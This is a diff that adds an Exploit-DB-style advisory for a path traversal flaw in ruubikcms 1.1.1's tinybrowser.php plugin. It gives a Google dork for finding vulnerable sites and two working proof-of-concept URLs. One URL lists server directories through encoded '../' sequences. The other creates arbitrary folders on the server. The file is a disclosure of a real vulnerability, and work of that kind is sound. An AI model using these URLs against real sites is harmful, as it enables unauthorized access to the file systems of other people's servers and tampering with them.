@@ -1,0 +1,38 @@
+# Exploit Title: [ruubikcms v1.1.1 Path Traversal vulnerability]
+# Google Dork: [powered by ruubikcms] 
+# Date: [2013-6-5]
+# Exploit Author: [expl0i13r]
+# Vendor Homepage: [http://www.ruubikcms.com/]
+# Software Link: [http://www.ruubikcms.com/ruubikcms/download.php?f=ruubikcms111.zip]
+# Version: [1.1.1]
+# Tested on: [Windows 7]
+# Contact: expl0i13r@gmail.com
+
+Description:
+-------------
+
+ruubikcms is vulnerable to Path traversal vulnerability, when logged in with any user account, list of files and directory names present on server will be displayed by changing path in URL, this vulnerability exist in "tinybrowser.php"
+
+Also using the same vulnerability we can create folders on server with path of our choice!
+
+
+POC of the vulnerabilities : 
+-----------------------------
+
+Following URL will list files and directory names available in "C:\", similarly we can change paths and list respective files
+
+http://127.0.0.1/[ruubikcms]/ruubikcms/tiny_mce/plugins/tinybrowser/tinybrowser.php?type=file&folder=..%2F..%2F..%2F..%2F..%2F..%2F..%2F&feid=filenameid
+
+
+Create Folder :
+-----------------
+
+By using same path traversal vulnerability we can create folder @ C:\ using below URL
+
+http://127.0.0.1/[ruubikcms]/ruubikcms/tiny_mce/plugins/tinybrowser/tinybrowser.php?type=file&folder=../../../../../bingo&feid=filenameid
+
+
+# blackpentesters.blogspot.com [2013-6-5]
+
+# Exploit-DB note:
+# Certain conditions apply however for everything to work as advertised.
